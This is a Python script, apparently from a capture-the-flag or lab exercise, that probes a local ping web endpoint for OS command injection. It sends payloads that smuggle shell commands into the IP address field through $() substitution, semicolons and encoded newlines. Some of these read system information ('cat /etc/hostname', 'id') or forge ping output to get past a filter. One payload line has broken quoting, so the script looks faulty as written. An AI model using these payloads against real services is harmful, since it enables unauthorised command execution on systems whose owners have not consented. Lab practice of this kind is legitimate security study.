import requests
import re

url = 'http://127.0.0.1:33052/ping'

# The key insight: the filter might be checking the string BEFORE execution
# Let's try payloads where the injected command is executed inline

payloads = [
    # Test if the app uses sh -c internally by injecting in the IP field
    "$(echo 127.0.0.1)",
    
    # Use $() to inject ping-like output directly
    "$(echo '2 packets transmitted, 2 received, 0% packet loss')",
    
    # Command substitution that would produce valid ping output
    '$(sh -c "echo 2 packets transmitted, 2 received, 0% packet loss")',
    
    # Try to get file content as the transmitted number
    "127.0.0.1$(cat /etc/hostname)",
    
    # Embed command in weird characters
    "127.0.0.1'$'(cat /etc/hostname)",
    
    # Test how the parser handles special chars
    "127.0.0.1...@..1",
    "127.0.0.1/24",
    "127.0.0.1$(id)",
    
    # Can we just make ping output fail and get error?
    "fakehost;echo '2 packets transmitted, 2 received, 0% packet loss'",
    
    # What if we break the ping with invalid input before semicolon?
    "';echo '2 packets transmitted, 2 received, 0% packet loss';'",
    
    # Double quote injection
    '\";echo \'2 packets transmitted, 2 received, 0% packet loss\';\#'',
    
    # Try using newlines in different ways
    '127.0.0.1%0aecho 2 packets transmitted, 2 received, 0% packet loss',
    '127.0.0.1%0d%0aecho 2 packets transmitted, 2 received, 0% packet loss',
]

for payload in payloads:
    print(f'┌─ Payload: {repr(payload)[:80]}...')
    
    try:
        resp = requests.post(url, data={'ip_address': payload}, timeout=10)
        
        print(f'│ Status: {resp.status_code}')
        
        if "Invalid input" in resp.text:
            print("│ FILTER BLOCKED")
        else:
            print("│ FILTER PASSED")
            
            # Extract parsed values from <pre> tag
            pre_match = re.search(r'<pre>(.*?)</pre>', resp.text, re.DOTALL)
            if pre_match:
                content = pre_match.group(1)
                print(f"│ <pre>: {content}")
        
    except Exception as e:
        print(f'│ ERROR: {e}')
    
    print('└─' + '-'*70)
    print()
